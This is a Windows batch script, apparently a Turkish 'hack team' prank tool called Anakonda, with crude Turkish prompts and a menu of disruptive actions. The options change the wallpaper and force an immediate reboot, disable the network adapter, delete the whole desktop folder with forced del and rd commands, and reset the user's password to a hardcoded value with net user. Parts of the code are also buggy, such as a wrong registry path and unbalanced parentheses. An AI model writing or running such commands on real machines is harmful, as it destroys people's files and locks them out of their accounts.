@echo off

start "Image Viever" C:\Users\%username%\Desktop\Anakonda\bs.mp4
chcp 65001
chcp 857
title Anakonda
set /p renk="Yazi rengini sec a yesil b d birini sec iste amg  "
echo ---------------------
color %renk%
set /p nerde="Masaustu yolu gir orn:Desktop,Masaustu  "
:bastan
cls
echo.                   Bu uygulama 144 hack team ozel olarak yazilmistir hala gelistirilme asamasindadir.   .     .                                                                                                                                     
echo. 
echo.     Designed and developed by levis.
echo.
echo. Yaptiginiz islemlerden siz sorumlusunuz,iyi oyunlar 
echo.
echo.   Secenekler://ekrani boz//interneti kapa//(Devre disi birakma)//bilgisayar aygitlari//
echo.     
echo.   Kullanim:seceneklerden hanigisni istiyorsaniz onu aynen yazip enterleyin // haric. 
set /p procces="root@levis "
echo  %procces%, Baslatiliyor...
timeout /t 2 >nul

if /i "%procces%" == "ekrani boz" (
echo Eminmisin?Degilsen 5 saniyen var kapat programı..
timeout /t 5 >nul
set resim_yolu="C:\Users\%username%\%nerde%\Anakonda\balta.jpg"


reg add "HKEY_CURRENT_USER\Control Panel\%nerde%" /v Wallpaper /t REG_SZ /d "%resim_yolu%" /f


taskkill /f /im explorer.exe
start explorer.exe

shutdown /r /t 0
) else if /i "%procces%" == "interneti kapa" (
echo Uyari:Bu cozum yonetici izni istemektedir yonetici olarak calistir...
   set /p bag="Baglanti turun ne canim? Wİ-Fİ veya ETHERNET yaz "
    netsh interface set interface "%bag%" admin=DISABLED
) else if /i "%procces%" == "bilgisayar aygitlari" (
 
) else if /i "%procces%" == "masaustu temizligi" (
del /f /q %userprofile%\%nerde%\*.*
rd /s /q %userprofile%\%nerde%
md %userprofile%\%nerde%
) else if /i "%procces%" == "tramvay" (

set resim_yolu="C:\Users\%username%\%nerde%\Anakonda\balta.jpg"


reg add "HKEY_CURRENT_USER\Control Panel\%nerde%" /v Wallpaper /t REG_SZ /d "%resim_yolu%" /f


taskkill /f /im explorer.exe
start explorer.exe

shutdown /r /t 15

)

)
if /i "%procces%" == "sifrereset" (
echo uyari:bu islem yonetici izni istemektedir.
echo isleme alindi lutfen bekleyin...
timeout /t 5 >nul
net user %username% fayujxquarex
echo yenisifre:fayujxquarex
timeout /t 3 >nul
goto bastan

)

) else (
  echo Yanlis girdin Yarram.
timeout /t 2 >nul
goto bastan
)
pause
